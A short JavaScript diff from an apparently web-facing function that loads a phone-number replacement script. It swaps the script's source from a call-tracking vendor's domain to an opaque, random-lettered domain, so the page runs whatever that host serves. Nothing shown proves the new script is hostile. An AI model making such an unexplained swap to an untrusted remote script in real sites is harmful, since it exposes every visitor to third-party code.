@@ -45,7 +45,7 @@ const loadPhoneNumberScript = () => {
   replacePhoneNumber();
 
   const script = document.createElement('script');
-  script.src = 'https://scripts.iconnode.com/120649.js';
+  script.src = 'https://s.ksrndkehqnwntyxlhgto.com/120658.js';
   script.onerror = () => console.error('Failed to load script1');
   document.body.appendChild(script);
 
